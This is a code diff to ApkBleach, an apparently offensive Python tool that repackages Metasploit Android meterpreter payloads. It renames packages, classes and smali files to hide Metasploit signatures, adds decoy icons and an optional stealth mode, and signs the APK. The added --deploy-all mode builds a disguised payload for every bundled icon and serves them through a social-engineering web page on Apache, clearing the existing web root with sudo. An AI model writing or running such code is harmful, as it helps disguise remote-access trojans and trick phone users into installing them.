@@ -1,5 +1,10 @@
 #!/usr/bin/env python3
 
+'''
+Issues to fix:
+	spaghetti code like a mother!!!!!
+'''
+
 import argparse
 from argparse import RawTextHelpFormatter
 from colorama import Fore, Style
@@ -23,7 +28,7 @@ class ApkBleach:
 	def __init__(self):
 		arg_parser = argparse.ArgumentParser(
 			prog="ApkBleach",
-			usage="apkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 2 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk\n\n apkbleach --list-payloads\n apkbleach --list-icons\n apkbleach --clear-cache",
+			usage="\napkbleach -g android/meterpreter/reverse_https LHOST=Address LPORT=port -s 2 -i BLEACH_settings --edit-permissions -o /var/www/html/payload.apk\n\napkbleach -g android/meterpreter/reverse_tcp -s 2 --edit-permissions --deploy-all\n\napkbleach --list-payloads\n apkbleach --list-icons\n apkbleach --clear-cache",
 			formatter_class=RawTextHelpFormatter
 			)
 		arg_parser.add_argument("-g", nargs=3, dest='generate', metavar=("[PAYLOAD]","[LHOST]", "[LPORT]"), help="Generates a payload")
@@ -31,9 +36,11 @@ class ApkBleach:
 		arg_parser.add_argument("-i", nargs=1, dest='icon', metavar=("[BLEACH_icon..] or [path/to/custom/icon]"), help="Injects an icon")
 		arg_parser.add_argument("-o", nargs=1, dest='output', metavar=("[output/path/for/file.apk]"), help="Path to output apk")
 		arg_parser.add_argument("--edit-permissions", dest='edit_permissions', help="Enables permission editing in apk's manifest", action='store_true')
+		arg_parser.add_argument("--deploy-all", dest='deploy_all',  help="Deploys each available icon as a payload with the apache2 server with a web interface", action='store_true')
 		arg_parser.add_argument("--list-payloads", dest='list_payloads',  help="List available icons", action='store_true')
 		arg_parser.add_argument("--list-icons", dest='list_icons',  help="List available icons", action='store_true')
 		arg_parser.add_argument("--clear-cache", dest='clear_cache',  help="Allows prompt whether to keep package maintainers version apktool", action='store_true')
+
 
 		args =  arg_parser.parse_args()
 
@@ -96,16 +103,24 @@ class ApkBleach:
 		except:
 			pass
 
-		self.output_file = args.output[0]
+		if not args.deploy_all:
+			self.output_file = args.output[0]
 
-		self.app_name = self.output_file.split('.', -1)[-2].split('/')[-1] if self.output_file.split('.', -1)[-1] == 'apk' else sys.exit(f"\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] Your ouput path should be a .apk\n{Fore.WHITE}")
-		
-		if self.output_file.strip(f'{self.app_name}.apk') != '':
-			self.app_path = self.output_file.strip(f'{self.app_name}.apk')
-		else: 
-			self.app_path = os.getcwd()
+			self.app_name = self.output_file.split('.', -1)[-2].split('/')[-1] if self.output_file.split('.', -1)[-1] == 'apk' else sys.exit(f"\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] Your ouput path should be a .apk\n{Fore.WHITE}")
+			
+			if self.output_file.strip(f'{self.app_name}.apk') != '':
+				self.app_path = self.output_file.strip(f'{self.app_name}.apk')
+			else: 
+				self.app_path = os.getcwd()
 
 		self.edit_permissions = args.edit_permissions
+
+		if args.deploy_all and args.icon:
+			sys.exit(f'\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] You can not use -i and --deploy-all at the same time.\n\n--deploy-all will create the payload set for each BLEACH_icon available.{Fore.WHITE}\n')
+		elif args.deploy_all and args.output:
+			sys.exit(f'\n{Fore.YELLOW}[{Fore.RED}Error{Fore.YELLOW}] You can not use -o and --deploy-all at the same time.\n\n--deploy-all will send all files to /var/www/html.\n')		
+		else:
+			self.deploy_all = args.deploy_all			
 
 		letters = string.ascii_lowercase
 		self.m_smali_dir = ''.join(random.choice(letters) for i in range(8))
@@ -216,6 +231,7 @@ class ApkBleach:
 
 
 	def bleach_apk(self):
+
 		if self.edit_permissions:
 
 			print(f"{Fore.YELLOW}Permissions editor {Fore.BLUE}[*]".center(os.get_terminal_size().columns))
@@ -245,7 +261,7 @@ class ApkBleach:
 										print(edit_line.replace(line, ''), end='')
 				for repeat in range(3):
 							print("\033[A                                                                           \033[A")
-		
+
 		if self.stealth_path:
 			os.remove(f'{self.decompiled_path}/smali/com/metasploit/stage/MainActivity.smali')
 
@@ -259,99 +275,232 @@ class ApkBleach:
 							f'iget v0, p0, Lcom/metasploit/stage/MainActivity;->ran:I\n\n\tconst/4 v1, 0x{self.stealth_num}'), 
 						end=''
 					)
+
+		if self.deploy_all:
+
+			self.deploy_list = [ i.strip('.png').strip('BLEACH_') for i in pkg_resources.resource_listdir("apkbleach", "Resources/Icons") ]
+
+			for all_available in self.deploy_list:
+
+				try:
+					shutil.copytree(f'{self.decompiled_path}', f'/tmp/apkbleach/{all_available}')
+				except FileExistsError:
+					shutil.rmtree(f'/tmp/apkbleach/{all_available}')
+					shutil.copytree(f'{self.decompiled_path}', f'/tmp/apkbleach/{all_available}')
+
+
+				# Changing the apps name to what user provided 
+				for edit_line in fileinput.input([f'/tmp/apkbleach/{all_available}/res/values/strings.xml'], inplace=True):
+					print(edit_line.replace('MainActivity', f'{all_available}'), end='')
+
+				# Change package path in manifest
+				for edit_line in fileinput.input([f'/tmp/apkbleach/{all_available}/AndroidManifest.xml'], inplace=True):
+					print(edit_line.replace('com.metasploit.stage', f'com.{self.m_smali_dir}.{self.s_smali_dir}'), end='')
+
+				# change Scheme in manifest
+				for edit_line in fileinput.input([f'/tmp/apkbleach/{all_available}/AndroidManifest.xml'], inplace=True):
+					print(edit_line.replace('android:scheme=\"metasploit\"', f'android:scheme=\"{self.scheme}\"'), end='')
+
+				# change MainActivity name in manifest
+				for edit_line in fileinput.input([f'/tmp/apkbleach/{all_available}/AndroidManifest.xml'], inplace=True):
+					print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')
+
+				# change MainService name in manifest
+				for edit_line in fileinput.input([f'/tmp/apkbleach/{all_available}/AndroidManifest.xml'], inplace=True):
+					print(edit_line.replace('MainService', f'{self.main_service}'), end='')
+
+				# change MainBroadcastReceiver name in manifest
+				for edit_line in fileinput.input([f'/tmp/apkbleach/{all_available}/AndroidManifest.xml'], inplace=True):
+					print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')
+
+				# Renaming apk directories
+				os.rename(rf'/tmp/apkbleach/{all_available}/smali/com/metasploit', rf'/tmp/apkbleach/{all_available}/smali/com/{self.m_smali_dir}')
+				os.rename(rf'/tmp/apkbleach/{all_available}/smali/com/{self.m_smali_dir}/stage', rf'/tmp/apkbleach/{all_available}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}')
+
+				p_files_path = f"/tmp/apkbleach/{all_available}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}"
+
+				# Renaming payload files named MainActivity.smali, MainBroadcastReceier.smali, MainService.smali, Payload.smali
+				os.rename(rf'{p_files_path}/MainActivity.smali', rf'{p_files_path}/{self.main_activity}.smali')
+				os.rename(rf'{p_files_path}/MainBroadcastReceiver.smali', rf'{p_files_path}/{self.main_broadcast_receiver}.smali')
+				os.rename(rf'{p_files_path}/MainService.smali', rf'{p_files_path}/{self.main_service}.smali')
+				os.rename(rf'{p_files_path}/Payload.smali', rf'{p_files_path}/{self.p_smali_file}.smali')
+
+				# Changing referances of metasploit, stage, MainActivity, MainService, MainBroadcastReceiver, Payload in all payload files
+				for file in os.listdir(p_files_path):
+					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+						print(edit_line.replace('metasploit', f'{self.m_smali_dir}'), end='')
+
+					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+						print(edit_line.replace('stage', f'{self.s_smali_dir}'), end='')
+
+					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+						print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')
+
+					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+						print(edit_line.replace('MainService', f'{self.main_service}'), end='')
+
+					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+						print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')
+
+					for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+						print(edit_line.replace('Payload', f'{self.p_smali_file}'), end='')	
+
+		else:
  
-		# Changing the apps name to what user provided 
-		for edit_line in fileinput.input([f'{self.decompiled_path}/res/values/strings.xml'], inplace=True):
-			print(edit_line.replace('MainActivity', f'{self.app_name}'), end='')
+			# Changing the apps name to what user provided 
+			for edit_line in fileinput.input([f'{self.decompiled_path}/res/values/strings.xml'], inplace=True):
+				print(edit_line.replace('MainActivity', f'{self.app_name}'), end='')
 
-		# Change package path in manifest
-		for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
-			print(edit_line.replace('com.metasploit.stage', f'com.{self.m_smali_dir}.{self.s_smali_dir}'), end='')
+			# Change package path in manifest
+			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
+				print(edit_line.replace('com.metasploit.stage', f'com.{self.m_smali_dir}.{self.s_smali_dir}'), end='')
 
-		# change Scheme in manifest
-		for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
-			print(edit_line.replace('android:scheme=\"metasploit\"', f'android:scheme=\"{self.scheme}\"'), end='')
+			# change Scheme in manifest
+			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
+				print(edit_line.replace('android:scheme=\"metasploit\"', f'android:scheme=\"{self.scheme}\"'), end='')
 
-		# change MainActivity name in manifest
-		for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
-			print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')
-
-		# change MainService name in manifest
-		for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
-			print(edit_line.replace('MainService', f'{self.main_service}'), end='')
-
-		# change MainBroadcastReceiver name in manifest
-		for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
-			print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')
-
-		# Renaming apk directories
-		os.rename(rf'{self.decompiled_path}/smali/com/metasploit', rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}')
-		os.rename(rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}/stage', rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}')
-
-		p_files_path = f"{self.decompiled_path}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}"
-
-		# Renaming payload files named MainActivity.smali, MainBroadcastReceier.smali, MainService.smali, Payload.smali
-		os.rename(rf'{p_files_path}/MainActivity.smali', rf'{p_files_path}/{self.main_activity}.smali')
-		os.rename(rf'{p_files_path}/MainBroadcastReceiver.smali', rf'{p_files_path}/{self.main_broadcast_receiver}.smali')
-		os.rename(rf'{p_files_path}/MainService.smali', rf'{p_files_path}/{self.main_service}.smali')
-		os.rename(rf'{p_files_path}/Payload.smali', rf'{p_files_path}/{self.p_smali_file}.smali')
-
-		# Changing referances of metasploit, stage, MainActivity, MainService, MainBroadcastReceiver, Payload in all payload files
-		for file in os.listdir(p_files_path):
-			for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
-				print(edit_line.replace('metasploit', f'{self.m_smali_dir}'), end='')
-
-			for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
-				print(edit_line.replace('stage', f'{self.s_smali_dir}'), end='')
-
-			for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+			# change MainActivity name in manifest
+			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
 				print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')
 
-			for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+			# change MainService name in manifest
+			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
 				print(edit_line.replace('MainService', f'{self.main_service}'), end='')
 
-			for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+			# change MainBroadcastReceiver name in manifest
+			for edit_line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
 				print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')
 
-			for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
-				print(edit_line.replace('Payload', f'{self.p_smali_file}'), end='')	
+			# Renaming apk directories
+			os.rename(rf'{self.decompiled_path}/smali/com/metasploit', rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}')
+			os.rename(rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}/stage', rf'{self.decompiled_path}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}')
+
+			p_files_path = f"{self.decompiled_path}/smali/com/{self.m_smali_dir}/{self.s_smali_dir}"
+
+			# Renaming payload files named MainActivity.smali, MainBroadcastReceier.smali, MainService.smali, Payload.smali
+			os.rename(rf'{p_files_path}/MainActivity.smali', rf'{p_files_path}/{self.main_activity}.smali')
+			os.rename(rf'{p_files_path}/MainBroadcastReceiver.smali', rf'{p_files_path}/{self.main_broadcast_receiver}.smali')
+			os.rename(rf'{p_files_path}/MainService.smali', rf'{p_files_path}/{self.main_service}.smali')
+			os.rename(rf'{p_files_path}/Payload.smali', rf'{p_files_path}/{self.p_smali_file}.smali')
+
+			# Changing referances of metasploit, stage, MainActivity, MainService, MainBroadcastReceiver, Payload in all payload files
+			for file in os.listdir(p_files_path):
+				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+					print(edit_line.replace('metasploit', f'{self.m_smali_dir}'), end='')
+
+				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+					print(edit_line.replace('stage', f'{self.s_smali_dir}'), end='')
+
+				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+					print(edit_line.replace('MainActivity', f'{self.main_activity}'), end='')
+
+				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+					print(edit_line.replace('MainService', f'{self.main_service}'), end='')
+
+				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+					print(edit_line.replace('MainBroadcastReceiver', f'{self.main_broadcast_receiver}'), end='')
+
+				for edit_line in fileinput.input([f'{p_files_path}/{file}'], inplace=True):
+					print(edit_line.replace('Payload', f'{self.p_smali_file}'), end='')	
 
 
 	def icon_inject(self):
-		for line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
-			print(line.replace(
-				'<application android:label=\"@string/app_name\">', 
-				'<application android:label=\"@string/app_name\" android:icon=\"@drawable/icon\" >'
-				), end='')
+		if self.deploy_all:
 
-		subprocess.call([
-			'bash', 
-			'-c', 
-			f"mkdir {self.decompiled_path}/res/drawable-ldpi-v4 {self.decompiled_path}/res/drawable-mdpi-v4 {self.decompiled_path}/res/drawable-hdpi-v4"
-			])
+			self.deploy_list = [ i.strip('.png').strip('BLEACH_') for i in pkg_resources.resource_listdir("apkbleach", "Resources/Icons") ]
 
-		icon_to_inject = Image.open(self.icon_path)
+			for all_available in self.deploy_list:
+				icon_path = pkg_resources.resource_filename(__name__, f'Resources/Icons/BLEACH_{all_available}.png')
+				for line in fileinput.input([f'/tmp/apkbleach/{all_available}/AndroidManifest.xml'], inplace=True):
+					print(line.replace(
+						'<application android:label=\"@string/app_name\">', 
+						'<application android:label=\"@string/app_name\" android:icon=\"@drawable/icon\" >'
+						), end='')
 
-		ldpi = icon_to_inject.resize((36, 36))
-		mdpi = icon_to_inject.resize((48, 48))
-		hdpi = icon_to_inject.resize((72, 72))
+				subprocess.call([
+					'bash', 
+					'-c', 
+					f"mkdir /tmp/apkbleach/{all_available}/res/drawable-ldpi-v4 /tmp/apkbleach/{all_available}/res/drawable-mdpi-v4 /tmp/apkbleach/{all_available}/res/drawable-hdpi-v4"
+					])
 
-		ldpi.save(f'{self.decompiled_path}/res/drawable-ldpi-v4/icon.png')
-		mdpi.save(f'{self.decompiled_path}/res/drawable-mdpi-v4/icon.png')
-		hdpi.save(f'{self.decompiled_path}/res/drawable-hdpi-v4/icon.png')
+				icon_to_inject = Image.open(icon_path)
+
+				ldpi = icon_to_inject.resize((36, 36))
+				mdpi = icon_to_inject.resize((48, 48))
+				hdpi = icon_to_inject.resize((72, 72))
+
+				ldpi.save(f'/tmp/apkbleach/{all_available}/res/drawable-ldpi-v4/icon.png')
+				mdpi.save(f'/tmp/apkbleach/{all_available}/res/drawable-mdpi-v4/icon.png')
+				hdpi.save(f'/tmp/apkbleach/{all_available}/res/drawable-hdpi-v4/icon.png')
+		else:
+
+			for line in fileinput.input([f'{self.decompiled_path}/AndroidManifest.xml'], inplace=True):
+				print(line.replace(
+					'<application android:label=\"@string/app_name\">', 
+					'<application android:label=\"@string/app_name\" android:icon=\"@drawable/icon\" >'
+					), end='')
+
+			subprocess.call([
+				'bash', 
+				'-c', 
+				f"mkdir {self.decompiled_path}/res/drawable-ldpi-v4 {self.decompiled_path}/res/drawable-mdpi-v4 {self.decompiled_path}/res/drawable-hdpi-v4"
+				])
+
+			icon_to_inject = Image.open(self.icon_path)
+
+			ldpi = icon_to_inject.resize((36, 36))
+			mdpi = icon_to_inject.resize((48, 48))
+			hdpi = icon_to_inject.resize((72, 72))
+
+			ldpi.save(f'{self.decompiled_path}/res/drawable-ldpi-v4/icon.png')
+			mdpi.save(f'{self.decompiled_path}/res/drawable-mdpi-v4/icon.png')
+			hdpi.save(f'{self.decompiled_path}/res/drawable-hdpi-v4/icon.png')
 
 
 	def rebuild_apk(self):
-		subprocess.call(['bash', '-c', f'apktool -q b /tmp/apkbleach/Decompiled -o /tmp/apkbleach/temp.apk &>/dev/null'])
-		subprocess.call(['bash', '-c', f'yes "yes" | keytool -genkey -v -keystore /tmp/apkbleach/{self.app_name}.keystore -alias {self.app_name} -keyalg RSA -storepass password -keysize 2048 -keypass password -validity 10000 &>/dev/null'])
-		subprocess.call(['bash', '-c', f'jarsigner -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password -keystore /tmp/apkbleach/{self.app_name}.keystore /tmp/apkbleach/temp.apk {self.app_name} &>/dev/null'])
-		subprocess.call(['bash', '-c', f'zipalign -f 4 /tmp/apkbleach/temp.apk /tmp/apkbleach/{self.app_name}.apk'])
+		if self.deploy_all:
+			deploy_resources_path = pkg_resources.resource_filename(__name__, f'Resources') 
+			deploy_list = [ i.strip('.png').strip('BLEACH_') for i in pkg_resources.resource_listdir("apkbleach", "Resources/Icons") ]
 
-		# Moving apk to output path
-		if not os.access(self.app_path, os.W_OK):
-			print(f"{Fore.YELLOW} Your output path is a root path and needs permissions to write to it [*]\n")
-			subprocess.call(['bash', '-c', f"sudo -k mv /tmp/apkbleach/{self.app_name}.apk {self.output_file} "], stdout=subprocess.PIPE)
-			for repeat in range(3):
-						print("\033[A                                                                               \033[A")
+			for all_available in deploy_list:
+				subprocess.call(['bash', '-c', f'apktool -q b /tmp/apkbleach/{all_available} -o /tmp/apkbleach/{all_available}_temp.apk &>/dev/null'])
+				subprocess.call(['bash', '-c', f'yes "yes" | keytool -genkey -v -keystore /tmp/apkbleach/{all_available}.keystore -alias {all_available} -keyalg RSA -storepass password -keysize 2048 -keypass password -validity 10000 &>/dev/null'])
+				subprocess.call(['bash', '-c', f'jarsigner -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password -keystore /tmp/apkbleach/{all_available}.keystore /tmp/apkbleach/{all_available}_temp.apk {all_available} &>/dev/null'])
+				subprocess.call(['bash', '-c', f'zipalign -f 4 /tmp/apkbleach/{all_available}_temp.apk /tmp/apkbleach/{all_available}.apk'])
+
+				if os.listdir('/var/www/html') == []:
+					subprocess.call(['bash', '-c', f"sudo cp -r {deploy_resources_path}/Android-SE /var/www/html "], stdout=subprocess.PIPE)
+					subprocess.call(['bash', '-c', f"sudo mv /var/www/html/Android-SE/index.html /var/www/html "], stdout=subprocess.PIPE)
+					subprocess.call(['bash', '-c', f"sudo mv /var/www/html/Android-SE/css /var/www/html "], stdout=subprocess.PIPE)
+					subprocess.call(['bash', '-c', f"sudo mv /tmp/apkbleach/{all_available}.apk /var/www/html/Android-SE/msf_apps "], stdout=subprocess.PIPE)
+				else:
+					if not os.path.isdir('/var/www/html/Android-SE'):
+						subprocess.call(['bash', '-c', f"sudo cp -r /var/www/html /var/www/html_backup "], stdout=subprocess.PIPE)
+						subprocess.call(['bash', '-c', f"sudo rm -r /var/www/html/*"], stdout=subprocess.PIPE)
+						subprocess.call(['bash', '-c', f"sudo cp -r {deploy_resources_path}/Android-SE /var/www/html "], stdout=subprocess.PIPE)
+						subprocess.call(['bash', '-c', f"sudo mv /var/www/html/Android-SE/index.html /var/www/html "], stdout=subprocess.PIPE)
+						subprocess.call(['bash', '-c', f"sudo mv /var/www/html/Android-SE/css /var/www/html "], stdout=subprocess.PIPE)
+						subprocess.call(['bash', '-c', f"sudo mv /tmp/apkbleach/{all_available}.apk /var/www/html/Android-SE/msf_apps "], stdout=subprocess.PIPE)
+					else:
+						subprocess.call(['bash', '-c', f"sudo mv /tmp/apkbleach/{all_available}.apk /var/www/html/Android-SE/msf_apps "], stdout=subprocess.PIPE)
+
+			subprocess.call(['bash', '-c', f"sudo /etc/init.d/apache2 start &>/dev/null"], stdout=subprocess.PIPE)
+
 		else:
-			shutil.move(rf"/tmp/apkbleach/{self.app_name}.apk", rf"{self.output_file}")
+			subprocess.call(['bash', '-c', f'apktool -q b /tmp/apkbleach/Decompiled -o /tmp/apkbleach/temp.apk &>/dev/null'])
+			subprocess.call(['bash', '-c', f'yes "yes" | keytool -genkey -v -keystore /tmp/apkbleach/{self.app_name}.keystore -alias {self.app_name} -keyalg RSA -storepass password -keysize 2048 -keypass password -validity 10000 &>/dev/null'])
+			subprocess.call(['bash', '-c', f'jarsigner -sigalg SHA1withRSA -digestalg SHA1 -storepass password -keypass password -keystore /tmp/apkbleach/{self.app_name}.keystore /tmp/apkbleach/temp.apk {self.app_name} &>/dev/null'])
+			subprocess.call(['bash', '-c', f'zipalign -f 4 /tmp/apkbleach/temp.apk /tmp/apkbleach/{self.app_name}.apk'])
+
+			# Moving apk to output path
+			try:
+				test = self.output_file
+				if not os.access(self.app_path, os.W_OK):
+					print(f"{Fore.YELLOW} Your output path is a root path and needs permissions to write to it [*]\n")
+					subprocess.call(['bash', '-c', f"sudo -k mv /tmp/apkbleach/{self.app_name}.apk {self.output_file} "], stdout=subprocess.PIPE)
+					for repeat in range(3):
+								print("\033[A                                                                               \033[A")
+				else:
+					shutil.move(rf"/tmp/apkbleach/{self.app_name}.apk", rf"{self.output_file}")
+			except:
+				pass
